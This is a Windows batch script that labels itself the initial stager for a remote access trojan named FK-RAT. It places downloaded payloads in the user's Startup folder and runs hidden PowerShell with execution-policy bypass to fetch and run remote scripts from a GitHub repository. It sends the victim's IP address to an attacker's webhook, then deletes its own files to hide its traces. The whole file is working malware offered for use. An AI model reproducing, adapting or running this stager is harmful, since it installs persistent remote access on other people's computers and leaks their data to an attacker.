@echo off
@REM initial stager for RAT
@REM created by: Sunnickel
@REM inspired by: COSMO

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
set "WEBHOOK=YOUR_WEBHOOK_LINK"

@REM move into Startup Dir
cd "%STARTUP%"

@REM write payloads to startup
powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/wget.cmd -OutFile wget.cmd" 

@REM run payload
powershell ./wget.cmd

@REM Send IP to Webhook
powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://github.com/Sunnickel/FK-RAT/raw/main/resources/webhook.ps1 -OutFile webhook.ps1"
powershell -ep bypass -File ./webhook.ps1 "%WEBHOOK%"

@REM cd change back to initial location
del webhook.ps1
cd "%INITIALPATH%"
del initial.cmd